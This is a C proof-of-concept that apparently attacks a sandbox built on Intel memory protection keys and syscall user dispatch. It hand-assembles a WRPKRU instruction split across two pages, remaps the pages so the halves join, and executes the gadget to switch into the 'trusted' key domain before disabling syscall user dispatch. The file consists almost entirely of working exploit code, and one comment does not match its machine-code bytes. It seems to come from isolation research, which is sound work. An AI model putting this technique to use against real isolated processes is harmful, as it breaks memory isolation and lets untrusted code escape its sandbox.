#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>

#include "_libattack.h"

int main(int argc, char **argv) {
    int r;

    void *p1 = mmap((void*)0x100000000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    void *p2 = mmap((void*)0x110000000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    void *guard = mmap((void*)0x100001000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

    unsigned char *p2_ret = ((unsigned char*)p2)+1024;
    *p2_ret = 0xc3;

    *(int*)p1 = 0xc3;

    unsigned char first_half[] = {
        0x50, 0x52, 0x51, // push rax, rdx, rcx
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x00, 0x0, 0x0, 0x0, // mov eax,0x55555550
        0x0f, 0x01 //wr..
    };
    
    unsigned char second_half[] = {
        0xef, // ..pku
        0x59, 0x5a, 0x58, // pop rcx, rdx, rax
        0xc3 // ret
    };

    unsigned char *p1_switch_to_trusted = ((unsigned char*)p1) + PAGE_SIZE - 14;

    memcpy(p1_switch_to_trusted, first_half, 14);
    memcpy(p2, second_half, sizeof(second_half));

    r = mprotect(p1, PAGE_SIZE, PROT_READ|PROT_EXEC);
    printf("mprotect(p1) = %p\n", p1);
    r = mprotect(p2, PAGE_SIZE, PROT_READ|PROT_EXEC);
    printf("mprotect(p2) = %p\n", p2);

    printf("calling p1\n");
    void (*fun_ptr)(void) = (void(*)(void))p1;
    fun_ptr();

    printf("calling p2\n");
    fun_ptr = (void(*)(void))p2_ret;
    fun_ptr();

    r = munmap(guard, PAGE_SIZE);
    if (r) perror("munmap");
    printf("munmap = %d\n", r);

    void *vr = mremap(p2, PAGE_SIZE, PAGE_SIZE, MREMAP_MAYMOVE|MREMAP_FIXED, ((char*)p1) + PAGE_SIZE);
    if (vr == MAP_FAILED) perror("mremap");

    printf("calling new pages %p\n", p1_switch_to_trusted);
    fun_ptr = (void(*)(void))p1_switch_to_trusted;
    fun_ptr();
    asm("ud2");

    disable_sud();
    sud_test();

    return 0;
}